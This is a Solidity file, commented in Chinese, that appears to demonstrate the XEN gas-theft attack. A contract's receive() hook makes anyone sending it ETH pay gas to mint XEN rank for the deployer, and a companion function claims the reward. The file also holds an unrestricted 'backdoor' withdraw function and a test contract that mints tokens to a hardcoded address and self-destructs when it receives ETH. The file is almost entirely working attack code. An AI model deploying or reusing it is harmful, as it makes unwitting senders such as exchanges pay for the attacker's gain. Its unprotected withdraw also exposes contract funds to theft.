// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

//xen接口
interface IRankedMintingToken {
    event RankClaimed(address indexed user, uint256 term, uint256 rank);

    event MintClaimed(address indexed user, uint256 rewardAmount);

    function claimRank(uint256 term) external;

    function claimMintReward() external;
}

contract recevieDemo{
    //xen 合约地址
    address public _addr = 0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8 ;
    //质押天数
    uint256 public term = 1;
    bytes[] array;

    receive() payable external{
        //xen mint接口
        IRankedMintingToken(_addr).claimRank(term);
        //合约里有余额就转入以下地址 自毁合约
        // selfdestruct(payable(0x6971b57a29764eD7af4A4a1ED7a512Dde9369Ef6));
        
    }
    //调用提取xen接口
    function claimMintReward() external{
        IRankedMintingToken(_addr).claimMintReward();

    }

    //提款后门
    // 提取合约内的余额
    function withdraw(address payable _address) public {
        _address.transfer(address(this).balance);
    }
}




//测试 erc20 代币
contract Mytoken is ERC20{
    constructor() ERC20("Mytoken","XTN"){}
    function formint(address to ,uint256 amount) public{
        _mint(to,amount);
    }
}
//Mytoken的接口
interface test{
    function formint(address to,uint256 amount) external;
}
//测试攻击原理
contract testDemo{
    receive() payable external{
        //测试原理
        // 合约地址：0xcF20F78278fA86ce8762aFfABd173F1254605A4c
        test(0xcF20F78278fA86ce8762aFfABd173F1254605A4c).formint(address(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8),10000000000000);
        selfdestruct(payable(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8));
    }
}